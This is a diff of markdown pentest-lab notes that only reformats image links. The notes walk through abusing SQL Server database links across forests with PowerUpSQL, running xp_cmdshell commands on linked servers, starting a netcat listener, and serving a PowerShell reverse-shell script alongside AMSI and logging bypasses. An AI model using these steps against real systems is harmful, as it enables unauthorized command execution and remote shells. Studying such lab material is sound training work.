@@ -29,28 +29,28 @@ Import PowerUpSQL
 
 Discovery (SPN Scanning)
 `Get-SQLInstanceDomain -Verbose`
-![[assets/Pasted image 20260318060944.png]]
+![Pasted image 20260318060944](assets/Pasted%20image%2020260318060944.png)
 
 Check Accessibility
 `Get-SQLConnectionTestThreaded`
 `GetSQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose`
 - try logging off and on to purge tickets if you have any
-![[assets/Pasted image 20260318061155.png]]
+![Pasted image 20260318061155](assets/Pasted%20image%2020260318061155.png)
 
 
 Gather Information
 `Get-SQLInstanceDomain | GeSQLServerInfo -Verbose`
-![[assets/Pasted image 20260318061217.png]]
+![Pasted image 20260318061217](assets/Pasted%20image%2020260318061217.png)
 - check authentication method, Windows means you can use domain users
 
 
 searching database links
 `Get-SQLServerLink -Instance <instance> -Verbose`
-![[assets/Pasted image 20260318062306.png]]
+![Pasted image 20260318062306](assets/Pasted%20image%2020260318062306.png)
 
 - crawling
 `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose`
-![[assets/Pasted image 20260318062655.png]]
+![Pasted image 20260318062655](assets/Pasted%20image%2020260318062655.png)
 - eu-sql1 is the machine in another forest (non-transitive trust)
 - was able to go across forests with just sql links
 
@@ -84,23 +84,23 @@ use the -QueryTarget parameter to run Query on a specified instance
 ### Get a reverse shell on an SQL server in the eurocorp forest by abusing database links from dcorp-mssql
 
 `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'cmd /c set username'"`
-![[assets/Pasted image 20260318063629.png]]
+![Pasted image 20260318063629](assets/Pasted%20image%2020260318063629.png)
 - look at customquery field
 - can see since we didn't do -QueryTarget, it ran on every link in the chian
 
 
 `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'cmd /c set username'" -QueryTarget eu-sql1`
-![[assets/Pasted image 20260318063757.png]]
+![Pasted image 20260318063757](assets/Pasted%20image%2020260318063757.png)
 - output is the same, but it only ran on eu-sql1
 
 
 start a listener
 `C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443`
-![[assets/Pasted image 20260318063839.png]]
+![Pasted image 20260318063839](assets/Pasted%20image%2020260318063839.png)
 
 host HFS to be able to send the file C:\AD\Tools\Invoke-PowerShellTcpEx to the target
 - make sure the IP at the end of the file matches the attacker VM
-![[assets/Pasted image 20260318063956.png]]
+![Pasted image 20260318063956](assets/Pasted%20image%2020260318063956.png)
 
 
 initiate the connection with the following
@@ -108,8 +108,8 @@ initiate the connection with the following
 - his face cam was covering the command, just experiment with it till it works
 	- need to have scriptloggingbypass, amsibypass, and Invoke-PowerShellTcpEx.ps1
 - check HFS to see if the target was able to GET the file
-![[assets/Pasted image 20260318064450.png]]
+![Pasted image 20260318064450](assets/Pasted%20image%2020260318064450.png)
 
 should now have a reverse shell
-![[assets/Pasted image 20260318064507.png]]
+![Pasted image 20260318064507](assets/Pasted%20image%2020260318064507.png)
 
